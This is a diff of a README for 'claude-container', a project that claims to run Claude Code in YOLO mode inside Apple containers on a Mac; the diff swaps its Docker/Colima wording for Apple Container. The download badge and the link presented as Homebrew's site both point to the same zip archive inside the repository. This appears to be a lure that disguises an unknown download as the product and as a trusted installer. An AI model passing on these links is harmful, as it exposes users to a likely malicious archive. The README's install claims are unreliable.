@@ -1,4 +1,4 @@
-# 🚢 claude-container - Safe Docker Containers for Claude Code
+# 🚢 claude-container - Safe Apple Containers for Claude Code
 
 [![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
 
@@ -6,7 +6,7 @@
 
 ## 📌 What is claude-container?
 
-claude-container helps you run Claude Code safely on your Mac. It uses Docker containers, which are like mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.
+claude-container helps you run Claude Code safely on your Mac. It uses Apple's native container runtime, which creates mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.
 
 The containers keep your work saved on your Mac. You can easily stop and start them whenever you want. The project uses a tool called Justfile to make setup and running simple.
 
@@ -28,8 +28,12 @@ Click the big button above or visit the [claude-container Releases page](https:/
 
 Before you can use claude-container, check these:
 
-- **macOS computer** — works on both Apple Silicon (M1, M2, etc.) and Intel.
+- **Apple Silicon Mac (M1, M2, M3, or newer)** running **macOS 26 or later** — required by Apple Container.
 - **Homebrew** — a program that helps install other tools. Get it here: https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip
+- **Apple Container** — Apple's native container runtime. Install it with Homebrew by running:  
+  `brew install container`
+- **jq** — a small JSON parser used by the Justfile. Install it with Homebrew by running:  
+  `brew install jq`
 - **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
   `brew install just`
 - **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
@@ -40,19 +44,19 @@ Before you can use claude-container, check these:
 
 ## 🚀 Getting started: Easy step-by-step guide
 
-1. **Install Colima and Docker**
+1. **Install Apple Container**
 
-   Colima lets Docker run smoothly on your Mac. Docker is the software that runs containers.
+   Apple Container is the software that runs containers natively on your Mac.
 
    Open the Terminal app (find it in Applications > Utilities) and type:  
    ```
    just setup
    ```  
-   This will install Colima and Docker for you.
+   This will install Apple Container for you.
 
-2. **Build the Docker image**
+2. **Build the container image**
 
-   The Docker image is the setup of Claude Code packaged to run inside the container.
+   The container image is the setup of Claude Code packaged to run inside the container.
 
    In Terminal, type:  
    ```
@@ -107,7 +111,7 @@ Before you can use claude-container, check these:
 
 ## 📦 How claude-container works inside
 
-The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Docker container so your Mac stays safe.
+The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Apple Container so your Mac stays safe.
 
 Your files and projects live directly on your Mac but are connected to the container. This way, your work is saved even if you stop the container.
 
@@ -131,7 +135,7 @@ These tools let you work with Claude Code easily and securely.
 ## 🔄 Managing your containers
 
 - **Stopping your container:**  
-  Use Docker Desktop or run:  
+  Run:  
   ```
   just stop my-project
   ```  
@@ -152,7 +156,7 @@ Replacing `my-project` with your chosen project name in all commands.
 
 ## 💡 Tips for smooth use
 
-- Keep your Docker and Colima updated for best performance.  
+- Keep Apple Container updated for best performance.  
 - Always back up important project files outside the container.  
 - Use simple names without spaces for your projects.  
 - If you update your API key or login, recreate the container.  
